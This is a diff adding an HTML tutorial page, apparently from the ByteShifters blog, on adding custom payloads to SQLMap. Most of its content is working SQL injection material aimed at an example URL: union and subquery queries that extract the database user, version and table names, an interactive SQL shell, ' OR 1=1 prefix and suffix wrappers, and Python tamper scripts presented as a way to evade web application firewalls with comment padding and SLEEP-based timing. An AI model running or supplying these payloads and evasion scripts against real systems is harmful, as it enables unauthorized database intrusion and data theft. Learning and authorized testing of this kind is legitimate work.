@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Add custom Payloads Directly in SQLMap | ByteShifters</title>
+<meta property="og:title" content="Add custom Payloads Directly in SQLMap | ByteShifters" />
+<meta name="twitter:title" content="Add custom Payloads Directly in SQLMap | ByteShifters" />
+<meta itemprop="name" content="Add custom Payloads Directly in SQLMap | ByteShifters" />
+<meta name="application-name" content="Add custom Payloads Directly in SQLMap | ByteShifters" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2024-10-03T00:00:00Z />
+    <meta property="article:published_time" content=2024-10-03T00:00:00Z />
+    <meta property="og:url" content="https://byteshifters.com/posts/hacking/sql-injections/custom-payloads-in-sqlmap/" />
+
+    
+    <meta property="og:article:author" content="ByteShifters" />
+    <meta property="article:author" content="ByteShifters" />
+    <meta name="author" content="ByteShifters" />
+    
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Add custom Payloads Directly in SQLMap",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2024-10-03",
+        "description": "",
+        "wordCount":  769 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2024-10-03",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "ByteShifters"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.122.0">
+
+    
+    <meta property="og:title" content="Add custom Payloads Directly in SQLMap" />
+<meta property="og:description" content="Example: Using --sql-query Simple Custom Payload sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --sql-query=&#34;SELECT version()&#34; Union-Based Custom Payload sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --sql-query=&#34;UNION SELECT null, database(), user(), version()&#34; Customizing Payloads with Tamper Scripts If you need more flexibility and want to systematically apply custom payloads, you can create a tamper script that modifies the default payloads used by SQLMap.
+Example: Custom Tamper Script Create a Custom Tamper Script
+Create a new Python file in the tamper directory of your SQLMap installation, for example, custom_payload_tamper." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://byteshifters.com/posts/hacking/sql-injections/custom-payloads-in-sqlmap/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-10-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-10-03T00:00:00+00:00" />
+
+
+
+    
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Add custom Payloads Directly in SQLMap"/>
+<meta name="twitter:description" content="Example: Using --sql-query Simple Custom Payload sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --sql-query=&#34;SELECT version()&#34; Union-Based Custom Payload sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --sql-query=&#34;UNION SELECT null, database(), user(), version()&#34; Customizing Payloads with Tamper Scripts If you need more flexibility and want to systematically apply custom payloads, you can create a tamper script that modifies the default payloads used by SQLMap.
+Example: Custom Tamper Script Create a Custom Tamper Script
+Create a new Python file in the tamper directory of your SQLMap installation, for example, custom_payload_tamper."/>
+
+
+    
+    <link rel="icon" type="image/png+xml" href="/icons/logo32.png">
+
+    <link rel="canonical" href="https://byteshifters.com/posts/hacking/sql-injections/custom-payloads-in-sqlmap/">
+    <link href="/style.min.a65edcf99b5d9c11dd8dc9c13f2e80eec76933d8449c8579cefe3c64191b71d4.css" rel="stylesheet">
+    <link href="/code-highlight.min.3dea1c7a362e3a7df3392c75d19c1efa95b2e82aa030c322a07a6caf50cb8e9a.css" rel="stylesheet">
+
+    
+    <link rel="icon" type="image/png+xml" href="/icons/logo32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/logo32.png">
+    
+
+
+
+
+<link rel="manifest" href="https://byteshifters.com/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#cccccc">
+
+    
+    <link rel="icon" type="image/png"  sizes="32x32" href="/icons/logo32.png">
+
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://byteshifters.com/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/contact/">
+                        Contact
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Add custom Payloads Directly in SQLMap</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2024-10-03T00:00:00&#43;00:00" itemprop="datePublished"> Oct 3, 2024 </time>
+                </div>
+                
+                
+                <div class="tags-list"><a href="https://byteshifters.com/tags/hacking/">#Hacking</a>
+                            <a href="https://byteshifters.com/tags/sqli/">#SQLi</a>
+                            </div>
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b></b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#example-using---sql-query">Example: Using <code>--sql-query</code></a>
+      <ul>
+        <li><a href="#simple-custom-payload">Simple Custom Payload</a></li>
+        <li><a href="#union-based-custom-payload">Union-Based Custom Payload</a></li>
+      </ul>
+    </li>
+    <li><a href="#customizing-payloads-with-tamper-scripts">Customizing Payloads with Tamper Scripts</a>
+      <ul>
+        <li><a href="#example-custom-tamper-script">Example: Custom Tamper Script</a></li>
+      </ul>
+    </li>
+    <li><a href="#advanced-example-with-multiple-payloads">Advanced Example with Multiple Payloads</a>
+      <ul>
+        <li><a href="#example-combining-multiple-techniques">Example: Combining Multiple Techniques</a></li>
+      </ul>
+    </li>
+    <li><a href="#leveraging-sqlmaps---sql-query-option">Leveraging SQLMap&rsquo;s <code>--sql-query</code> Option</a>
+      <ul>
+        <li><a href="#examples-custom-queries-with---sql-query">Examples: Custom Queries with <code>--sql-query</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#using---sql-shell-for-interactive-injection">Using <code>--sql-shell</code> for Interactive Injection</a>
+      <ul>
+        <li><a href="#example-starting-sql-shell">Example: Starting SQL Shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#creating-custom-tamper-scripts">Creating Custom Tamper Scripts</a>
+      <ul>
+        <li><a href="#example-advanced-custom-tamper-script">Example: Advanced Custom Tamper Script</a></li>
+      </ul>
+    </li>
+    <li><a href="#custom-payloads-with---prefix-and---suffix">Custom Payloads with <code>--prefix</code> and <code>--suffix</code></a>
+      <ul>
+        <li><a href="#examples-using---prefix-and---suffix">Examples: Using <code>--prefix</code> and <code>--suffix</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#using-sqlmaps---eval-option">Using SQLMap&rsquo;s <code>--eval</code> Option</a>
+      <ul>
+        <li><a href="#example-dynamic-payload-generation-with---eval">Example: Dynamic Payload Generation with <code>--eval</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#combining-techniques-for-automated-testing">Combining Techniques for Automated Testing</a>
+      <ul>
+        <li><a href="#example-full-automated-test-with-custom-payloads">Example: Full Automated Test with Custom Payloads</a></li>
+      </ul>
+    </li>
+    <li><a href="#example-of-an-advanced-tamper-script-for-automated-testing">Example of an Advanced Tamper Script for Automated Testing</a>
+      <ul>
+        <li><a href="#example-randomized-time-based-injection">Example: Randomized Time-Based Injection</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h2 id="example-using---sql-query">Example: Using <code>--sql-query</code></h2>
+<h3 id="simple-custom-payload">Simple Custom Payload</h3>
+<pre tabindex="0"><code>sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --sql-query=&#34;SELECT version()&#34;
+</code></pre><h3 id="union-based-custom-payload">Union-Based Custom Payload</h3>
+<pre tabindex="0"><code>sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --sql-query=&#34;UNION SELECT null, database(), user(), version()&#34;
+</code></pre><h2 id="customizing-payloads-with-tamper-scripts">Customizing Payloads with Tamper Scripts</h2>
+<p>If you need more flexibility and want to systematically apply custom payloads, you can create a tamper script that modifies the default payloads used by SQLMap.</p>
+<h3 id="example-custom-tamper-script">Example: Custom Tamper Script</h3>
+<p><strong>Create a Custom Tamper Script</strong></p>
+<p>Create a new Python file in the tamper directory of your SQLMap installation, for example, <code>custom_payload_tamper.py</code>.</p>
+<pre tabindex="0"><code>#!/usr/bin/env python
+import random
+
+__priority__ = 1
+
+def dependencies():
+    pass
+
+def tamper(payload):
+    &#34;&#34;&#34;
+    Custom tamper script to inject custom payloads
+    &#34;&#34;&#34;
+    if payload:
+        payload = payload.replace(&#34; &#34;, &#34;/**/&#34;)
+        if &#34;SELECT&#34; in payload.upper():
+            payload = payload.replace(&#34;SELECT&#34;, &#34;SELECT/**/custom_function(),&#34;)
+    return payload
+</code></pre><p><strong>Save the Script</strong></p>
+<p>Save this script in the tamper directory of SQLMap.</p>
+<p><strong>Use the Tamper Script with SQLMap</strong></p>
+<p>Run SQLMap with your custom tamper script to apply your modifications to the payloads.</p>
+<pre tabindex="0"><code>sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --tamper=custom_payload_tamper
+</code></pre><h2 id="advanced-example-with-multiple-payloads">Advanced Example with Multiple Payloads</h2>
+<p>You can combine multiple payloads and tamper scripts to create more complex injection tests. Below is an advanced example where custom payloads are systematically applied to the requests.</p>
+<h3 id="example-combining-multiple-techniques">Example: Combining Multiple Techniques</h3>
+<p><strong>Create a Complex Tamper Script</strong></p>
+<pre tabindex="0"><code>#!/usr/bin/env python
+
+import random
+
+__priority__ = 1
+
+def dependencies():
+    pass
+
+def tamper(payload):
+    &#34;&#34;&#34;
+    Custom tamper script to apply multiple custom payloads
+    &#34;&#34;&#34;
+    if payload:
+        payload = payload.replace(&#34; &#34;, &#34;/**/&#34;)
+        
+        if &#34;UNION&#34; in payload.upper():
+            payload += &#34; UNION SELECT null, user(), database(), version() --&#34;
+        
+        if &#34;AND&#34; in payload.upper():
+            payload += &#34; AND IF(1=1, SLEEP(5), 0) --&#34;
+        
+        if &#34;OR&#34; in payload.upper():
+            payload += &#34; OR (SELECT 1/0 FROM dual) --&#34;
+        
+    return payload
+</code></pre><p><strong>Save and Use the Script</strong></p>
+<p>Save this script as <code>complex_tamper.py</code> in the tamper directory.</p>
+<p><strong>Run SQLMap with the Complex Tamper Script</strong></p>
+<pre tabindex="0"><code>sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --tamper=complex_tamper
+</code></pre><h2 id="leveraging-sqlmaps---sql-query-option">Leveraging SQLMap&rsquo;s <code>--sql-query</code> Option</h2>
+<p>The <code>--sql-query</code> option allows you to directly specify SQL queries to be executed. This is useful for precise injection testing.</p>
+<h3 id="examples-custom-queries-with---sql-query">Examples: Custom Queries with <code>--sql-query</code></h3>
+<p><strong>Direct Version Query</strong></p>
+<p>This command checks the version of the database:</p>
+<pre tabindex="0"><code>sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --sql-query=&#34;SELECT version()&#34;
+</code></pre><p><strong>Union-Based Query</strong></p>
+<p>This command retrieves multiple pieces of information such as the database name, current user, and database version:</p>
+<pre tabindex="0"><code>sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --sql-query=&#34;UNION SELECT null, database(), user(), version()&#34;
+</code></pre><p><strong>Subquery Injection</strong></p>
+<p>This command uses a subquery to extract table names:</p>
+<pre tabindex="0"><code>sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --sql-query=&#34;SELECT (SELECT table_name FROM information_schema.tables LIMIT 1)&#34;
+</code></pre><h2 id="using---sql-shell-for-interactive-injection">Using <code>--sql-shell</code> for Interactive Injection</h2>
+<p>SQLMap&rsquo;s <code>--sql-shell</code> provides an interactive SQL shell for executing arbitrary SQL commands.</p>
+<h3 id="example-starting-sql-shell">Example: Starting SQL Shell</h3>
+<p><strong>Interactive Shell</strong></p>
+<p>Start an interactive SQL shell to manually execute SQL commands:</p>
+<pre tabindex="0"><code>sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --sql-shell
+</code></pre><p><strong>Executing Commands in Shell</strong></p>
+<p>Execute commands in the SQL shell to retrieve information:</p>
+<pre tabindex="0"><code>sql-shell&gt; SELECT user();
+sql-shell&gt; SELECT database();
+sql-shell&gt; SELECT table_name FROM information_schema.tables;
+</code></pre><h2 id="creating-custom-tamper-scripts">Creating Custom Tamper Scripts</h2>
+<p>Tamper scripts can modify payloads dynamically to bypass WAFs and other security measures.</p>
+<h3 id="example-advanced-custom-tamper-script">Example: Advanced Custom Tamper Script</h3>
+<p><strong>Script to Add Random Comments</strong></p>
+<p>Create a script <code>random_comment_tamper.py</code>:</p>
+<pre tabindex="0"><code>#!/usr/bin/env python
+
+import random
+
+__priority__ = 1
+
+def dependencies():
+    pass
+
+def tamper(payload):
+    &#34;&#34;&#34;
+    Adds random inline comments to the payload
+    &#34;&#34;&#34;
+    if payload:
+        parts = payload.split(&#34; &#34;)
+        payload = &#34; /*&#34; + str(random.randint(1000, 9999)) + &#34;*/ &#34;.join(parts)
+    return payload
+</code></pre><p><strong>Save and Use the Script</strong></p>
+<p>Save this script in the tamper directory of SQLMap and use it:</p>
+<pre tabindex="0"><code>sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --tamper=random_comment_tamper
+</code></pre><h2 id="custom-payloads-with---prefix-and---suffix">Custom Payloads with <code>--prefix</code> and <code>--suffix</code></h2>
+<p>You can use <code>--prefix</code> and <code>--suffix</code> to add custom SQL snippets before and after the payload.</p>
+<h3 id="examples-using---prefix-and---suffix">Examples: Using <code>--prefix</code> and <code>--suffix</code></h3>
+<p><strong>Adding Prefix and Suffix</strong></p>
+<p>Add custom snippets before and after the payload:</p>
+<pre tabindex="0"><code>sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --prefix=&#34;/**/SELECT/**/&#34; --suffix=&#34;/**/FROM/**/dual&#34;
+</code></pre><p><strong>Injecting with Custom Wrappers</strong></p>
+<p>Wrap the payload with custom conditions:</p>
+<pre tabindex="0"><code>sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --prefix=&#34;&#39; OR 1=1; /*&#34; --suffix=&#34;*/ --&#34;
+</code></pre><h2 id="using-sqlmaps---eval-option">Using SQLMap&rsquo;s <code>--eval</code> Option</h2>
+<p>The <code>--eval</code> option allows for evaluating Python code before sending requests, which can be used for dynamic payload generation.</p>
+<h3 id="example-dynamic-payload-generation-with---eval">Example: Dynamic Payload Generation with <code>--eval</code></h3>
+<p><strong>Dynamic Generation</strong></p>
+<p>Generate a dynamic payload using Python code:</p>
+<pre tabindex="0"><code>sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --eval=&#34;import random; id=random.randint(1,10)&#34;
+</code></pre><h2 id="combining-techniques-for-automated-testing">Combining Techniques for Automated Testing</h2>
+<p>You can combine multiple techniques for comprehensive automated testing.</p>
+<h3 id="example-full-automated-test-with-custom-payloads">Example: Full Automated Test with Custom Payloads</h3>
+<p><strong>Advanced Custom Payloads in Combination</strong></p>
+<p>Combine various methods to create a comprehensive testing command:</p>
+<pre tabindex="0"><code>sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; \
+   --sql-query=&#34;UNION SELECT null, database(), user(), version()&#34; \
+   --tamper=random_comment_tamper \
+   --prefix=&#34;&#39; OR 1=1; /*&#34; \
+   --suffix=&#34;*/ --&#34; \
+   --level=5 --risk=3
+</code></pre><h2 id="example-of-an-advanced-tamper-script-for-automated-testing">Example of an Advanced Tamper Script for Automated Testing</h2>
+<h3 id="example-randomized-time-based-injection">Example: Randomized Time-Based Injection</h3>
+<p>Create a script <code>random_time_tamper.py</code>:</p>
+<pre tabindex="0"><code>#!/usr/bin/env python
+
+import random
+
+__priority__ = 1
+
+def dependencies():
+    pass
+
+def tamper(payload):
+    &#34;&#34;&#34;
+    Adds a random time-based delay to the payload
+    &#34;&#34;&#34;
+    if payload:
+        delay = random.randint(1, 10)
+        payload = payload.replace(&#34; &#34;, &#34;/**/&#34;) + f&#34; AND SLEEP({delay})&#34;
+    return payload
+</code></pre><p><strong>Use with SQLMap</strong></p>
+<p>Use the script with SQLMap:</p>
+<pre tabindex="0"><code>sqlmap -u &#34;http://example.com/vulnerable.php?id=1&#34; --tamper=random_time_tamper
+</code></pre>
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        
+        byteshifters.com
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="https://byteshifters.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
